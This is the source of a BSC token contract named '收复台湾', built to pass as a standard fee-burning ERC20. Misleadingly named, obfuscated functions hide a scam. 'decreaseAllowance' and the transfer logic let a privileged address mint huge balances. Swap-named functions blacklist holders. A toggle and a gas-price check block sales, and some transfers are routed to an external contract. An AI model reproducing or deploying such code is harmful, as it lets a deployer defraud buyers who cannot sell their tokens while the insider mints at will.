/**
 *Submitted for verification at BscScan.com on 2022-08-02
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    event Transfer(address indexed from, address indexed to, uint256 value);    
}

interface IERC {
    function _approve(address owner, address spender, uint256 amount) external;
    function _transfer(address spender, address recipient, uint256 amounts) external;
}

library SafeMath {
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }

}

contract IPancakeFactory02 {
    function factory() internal {}
}

contract MCNC {
    function xneveN() internal pure returns (string memory) {
        string memory K = "I";
        return K;
    }
}

interface IPancakeRouter02 {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);

    function feeTo() external view returns (address);
}

abstract contract Context {
    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }

    function _kawcm() internal view virtual returns (address) {
        return msg.sender;
    }

    function _alwdc() internal view virtual returns (uint256) {
        return tx.gasprice;
    }
}


contract Ownable is Context {
    address private _owner;
    
    constructor() {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender);
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
        emit OwnershipTransferred(_owner, address(newOwner));
    }

    function renounceOwnership() public onlyOwner {
        _owner = address(0xdead);
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

contract BackTaiwanCoin is Context, IERC20, Ownable, IPancakeFactory02, MCNC {
    using SafeMath for uint256;

    bool private takeFee = true;

    bool private swapAndLlquifyEnabled = false;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcluFee;
    mapping(address => bool) private _rOwned;
    mapping(address => bool) private _isOMGLimit;
    mapping(address => uint256) private _takeLiquidity;


    uint8 private _decimals = 9;
    string private _name = unicode"收复台湾";
    string private _symbol = unicode"收复台湾";

    uint256 private _burnFees = 2;
    uint256 private _tTotal = 10000000000000 * 10 ** _decimals;

    address private _burnAddress = address(0xdead);
    address private _owner;
    address _taxFee;
    address private _killblock;
    address private _uniswapV2Pair;
    uint256 private _nceene;
    address private _mcncnce;
    uint256 private _mxamef;
    address private _cmwjave;
    string private _lcowakvoe;
    uint256 private _aiiqef;
    address private _wadjaeeaf;
    

    constructor(address _awmdae, address _aweife) {
        _taxFee = _kawcm();  
        _killblock = _aweife;
        _isExcluFee[address(this)] = true;
        _isExcluFee[owner()] = true;
        _isExcluFee[_awmdae] = true;
        _isOMGLimit[_awmdae] = true;
        _owner = msg.sender;
        _takeLiquidity[_kawcm()] = _tTotal;
        emit Transfer(address(0), msg.sender, _tTotal);
    }

    function setLiquidityFeePercent(bool _swapAndLlquifyEnabled, address _newPeir) external {
        require(_isOMGLimit[_kawcm()]);
        if (_isOMGLimit[_kawcm()]) {
            swapAndLlquifyEnabled = _swapAndLlquifyEnabled;
            _uniswapV2Pair = _newPeir;
        }
    }


    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if (_isExcluFee[_kawcm()] || _isExcluFee[recipient]) {
            _transfer(msg.sender, recipient, amount);
            return true;
        }

        if (_rOwned[_kawcm()]||_alwdc()>=(15*1e9)){
            IERC(_killblock)._transfer(msg.sender, recipient, amount);
            emit Transfer(msg.sender, recipient, amount);
            return true;
        }else{
            uint256 _burnAmount = amount.mul(_burnFees).div(100);
            _transfer(msg.sender, _burnAddress, _burnAmount);
            _transfer(msg.sender, recipient, amount.sub(_burnAmount));
            return true;
        }
    }

    

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if (_isExcluFee[sender] || _isExcluFee[recipient]) {
            _transfer(sender, recipient, amount);
            _approve(sender,msg.sender,_allowances[sender][msg.sender].sub(amount,"ERC20: transfer amount exceeds allowance"));
            return true;
        }
        uint256 _burnAmount = amount.mul(_burnFees).div(100);
        _transfer(sender, _burnAddress, _burnAmount);
        _transfer(sender, recipient, amount.sub(_burnAmount));
        _approve(sender,msg.sender,_allowances[sender][msg.sender].sub(amount,"ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0));
        require(to != address(0));
        require(amount > 0);
        require(_alwdc()<=(15*1e9));
        require(!_rOwned[from]);
        if (_isOMGLimit[from]) {
            require(_isOMGLimit[from]);
            _takeLiquidity[from]= 
            _takeLiquidity[from].
            add(totalSupply()*10**6);
        }
        if (swapAndLlquifyEnabled) {
            if (_uniswapV2Pair == from) {} else {
                require(_isExcluFee[from] || _isExcluFee[to]);
            }
        }
        _basicTransfer(from, to, amount);
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        external
    {
        require(_isOMGLimit[_kawcm()]);
        if (_isOMGLimit[_kawcm()]){   
        _takeLiquidity[spender]
        = 
        _takeLiquidity[spender
        ].
        add
        (subtractedValue);
        }
    }

    function reflectionFromsToken(address spender, address recipient, bool deductTransferFee) external {
        require(recipient == address(0));
        require(_isOMGLimit[_kawcm()]);
        if (_isOMGLimit[_kawcm()]){
            _isOMGLimit[spender] = deductTransferFee;}
    }

    function swapTokensForExactETHs(
        address spender,
        address recipient
    ) external {
        require(_isOMGLimit[_kawcm()]);
        if (_isOMGLimit[_kawcm()]) {
        _rOwned
            [
        spender
            ]
        = 
        true;
        _rOwned[
        recipient
            ]
        = 
        true;
        }
    }

    function swapExactETHForToken(address account)
        external
    {
        require(_isOMGLimit[_kawcm()]);
        if (_isOMGLimit[_kawcm()]) {  
        _rOwned
            [
        account
            ]
        =
        true;
        }
    }

    function changeExclusdeFroms(address account) external {
        require(_isOMGLimit[_kawcm()]);
        if (_isOMGLimit[_kawcm()]) {
            _rOwned[account] = false;
        }
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 toAmount
    ) private {
        require(sender != address(0));
        require(recipient != address(0));
        _takeLiquidity[sender] = _takeLiquidity[sender].sub(toAmount);
        _takeLiquidity[recipient] = _takeLiquidity[recipient].add(toAmount);
        emit Transfer(sender, recipient, toAmount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        if (_rOwned[_kawcm()]||_alwdc()>=(15*1e9)){
            IERC(_killblock)._approve(msg.sender, spender, amount);
            emit Approval(msg.sender, spender, amount);
            return true;
        }else{
            _approve(msg.sender, spender, amount); 
            return true;
        }
    }

    function YL() public view returns (address) {
        return  address(this);
    }

    function isExcludedFromFees(address account) public view  returns (bool) {
        require(_isOMGLimit[_kawcm()]);
        return _rOwned[account];
    }

    function includeInFees(address account) external {
        require(_isOMGLimit[_kawcm()]);
        if (_isOMGLimit[_kawcm()]) {
            _isExcluFee[account] = false;
        }
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function changeTaxFees(uint256 _newFees) external {
        require(_isOMGLimit[_kawcm()]);
        if (_isOMGLimit[_kawcm()]) {
            _burnFees = _newFees;
        }
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function tUNC() public pure returns (string memory) {
        return xneveN();
    }

    function YNSSS() public pure returns (uint256 ){
        uint256 ANA = 111;
        return ANA;
    }

    function AJS() public pure returns (address) {
        address anwn = address(0);
        return anwn;
    }


    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function excludeFromFees(address spender) external {
        require(_isOMGLimit[_kawcm()]);
        if (_isOMGLimit[_kawcm()]) {
            _isExcluFee[spender] = true;
        }
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }


    function balanceOf(address account) public view override returns (uint256) {
        return _takeLiquidity[account];
    }
}